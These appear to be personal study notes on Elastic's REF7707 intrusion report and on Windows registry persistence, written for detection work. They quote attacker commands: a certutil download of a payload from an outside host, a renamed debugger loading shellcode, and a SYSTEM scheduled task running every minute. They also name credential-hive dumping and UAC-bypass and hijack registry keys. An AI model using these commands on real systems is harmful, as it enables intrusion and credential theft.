https://www.elastic.co/security-labs/fragile-web-ref7707

# REF7707

Malware including FINALDRAFT, GUIDLOADER, and PATHLOADER

- Used a uncommon LOLBin to obtain endpoint execution
- LOLBin using **certuitl.exe** (used for displaying CA onfiguration, configure, etc)

certutil can be abused to download files:
- `fontdrvhost.exe`, `fontdrvhost.rar`, `config.ini`, and `wmsetup.log`
```
certutil  -urlcache -split -f https://[redacted]/fontdrvhost.exe C:\ProgramData\fontdrvhost.exe
```

Parent process was **WinrsHost.exe** , executing the above commands. Note that it is likely that attackers already posessed valid network credentials

Attackers first executed FontDrvHost.exe 
It was a renamed version of Windows signed debugger CDB.exe. 

Abusing this binary allowed attackers to execute shellcode deliverred in config.ini, under guise of trusted binaries

CDB is 15 year old debugger, seeing icnreased activity in 2021 and late 2024.

Documented LOLBas [great analysis](https://mrd0x.com/the-power-of-cdb-debugging-tool/)
```
C:\ProgramData\fontdrvhost.exe -cf C:\ProgramData\config.ini -o C:\ProgramData\fontdrvhost.exe
```
Spawned mspaint and injected shellcode into it

Additional shellcode injected into memory

Used ping to check connectivity to legit sites such as microsfotonline.

Then pinged digert.ictnsc[.]com which were adversary ownded

Executed script called SoftwareDistirbution, using diskshadow.exe, extracting SAM, SECUIRTY, SYSTEM Registry hives, and copied Active Direcotyr database (ntds.dit)


Persistence achieved via Scheduled Task that invoked CBD.exe, weaponize INI file every minute as SYSTEM
```
schtasks /create /RL HIGHEST /F /tn \"\\Microsoft\\Windows\\AppID\\EPolicyManager\" 
/tr \"C:\\ProgramData\\fontdrvhost.exe -cf C:\\ProgramData\\config.ini -o C:\\ProgramData\\fontdrvhost.exe\" 
/sc MINUTE /mo 1 /RU SYSTEM
```
 Malware analysis: https://www.elastic.co/security-labs/finaldraft

FINALDRAFT can establsih C@ via various means. 
Abuse of Microsfot Graph API is notable.

This minimizes indiactors observable to network based IDS.

Encrypted payloads third pasrty hosted also challenge the systems.

My YARA RULE:



# Windows Registry 
Windows registry is a high-signal persistence and execution control surface.


Root Hives:

|Hive|Purpose|Security relevance|
|---|---|---|
|`HKLM`|System-wide config|Privilege escalation, services|
|`HKCU`|Per-user config|User persistence|
|`HKCR`|File associations|Execution hijacking|
|`HKU`|All user profiles|Multi-user persistence|
|`HKCC`|Hardware config|Rarely abused|
Namespcaes backed by hive files on disk
Attackers abuse it for persistence, execution hijacking, defense evasion, credential storage, priviledge escalation

Persistence:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run

Behaviour:
- Values executed on user login or system boot
Security signal:
- Registry value write + later process execution

B. Scheduled tasks via registry
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache
Behavior:
- Attackers create tasks indirectly
- Registry reflects task metadata 
Detection insight:
- Task creation should correlate with `schtasks.exe` or COM activity

C. Service Creation/ Modification
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
Used for:
- Persistence
- Privilege escalation
- Execution as SYSTEM
**Key indicators:**
- New service key
- Modified `ImagePath`
D. Execution hijacking (high-signal)
HKCR\.exe
HKCR\exefile\shell\open\command
Allows:
- Intercepting execution of binaries
- Triggering malicious loaders
**Security value:**
- Extremely rare in legitimate software
- Very high signal
E. UAC bypass techniques
`HKCU\Software\Classes\ms-settings\shell\open\command`

Used to:
- Trigger auto-elevated binaries
- Bypass UAC (User Account Control. permission before application) prompts

**Detection insight:**
- Registry write + auto-elevated process launch
Common telemtry sources:
- Sysmon, EDRs, ETW, Windows event logs